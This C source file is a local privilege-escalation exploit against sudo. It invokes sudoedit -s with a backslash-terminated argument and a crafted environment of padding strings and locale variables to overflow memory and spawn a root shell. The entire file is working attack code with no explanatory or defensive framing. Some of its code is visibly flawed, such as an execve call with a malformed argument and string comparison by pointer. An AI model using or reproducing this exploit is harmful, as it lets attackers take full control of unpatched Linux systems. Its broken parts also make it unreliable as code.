#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>

char* sudo_ver;

void getSudoVersion(){
    FILE*  fp;
    char path[1035];
    const char* cmd = "sudo --version  | tr '\\n' \' \' | cut -d ' ' -f 3";
    fp = popen(cmd, "r");
    if(fp == NULL)
        return NULL;
    while(fgets(path, sizeof(path), fp) != NULL)
        sudo_ver = path;
    sudo_ver[strcspn(sudo_ver, "\n")] = 0;
    pclose(fp);
}

bool isVulnerable(){
    FILE*  fp;
    char path[1035];
    const char* back = "&";
    execve("./test.sh", back, NULL);
    fp = popen("echo $?", "r");
    if(fp == NULL)
        return false;

    while(fgets(path, sizeof(path), fp) != NULL)
        if(path == "1")
            return false;
    pclose(fp);
    return true;
}

void main(void) {


    bool vuln = isVulnerable();
    getSudoVersion();

    if(!vuln){
        printf("Current sudo version %s is not vulnerable!\n", sudo_ver);
        exit(1);
    }
    else{
        printf("[+] Sudo version %s is vulnerable!\n", sudo_ver);
    }
    int i;
    char buf[0xf0] = {0}; // Setting the buffer size to 
    memset(buf, 'Y', 0xe0);
    strcat(buf, "\\");
    char* argv[] = { "sudoedit", "-s", buf, NULL };

    char messages[0xe0] = {"LC_MESSAGES=en_GB.UTF-8@"};
    memset(messages + strlen(messages), 'A', 0xb8);

    char telephone[0x50] = {"LC_TELEPHONE=C.UTF-8@"};
    memset(telephone + strlen(telephone), 'A', 0x28);

    char measurement[0x50] = {"LC_MEASUREMENT=C.UTF-8@"};
    memset(measurement + strlen(measurement), 'A', 0x28);

    char overflow[0x500] = {0};
    memset(overflow, 'X', 0x4cf);
    strcat(overflow, "\\");

    char* envp[] = {
        overflow,
        "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\",
        "XXXXXXX\\",
        "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\",
        "\\", "\\", "\\", "\\", "\\", "\\", "\\",
        "x/x\\",
        "Z",
        messages,
        telephone,
        measurement,
        NULL
    };
    printf("Spawning a root shell...\n");
    sleep(1);
    // Invoke sudoedit with our argv & envp.
    execve("/usr/bin/sudoedit", argv, envp);
}
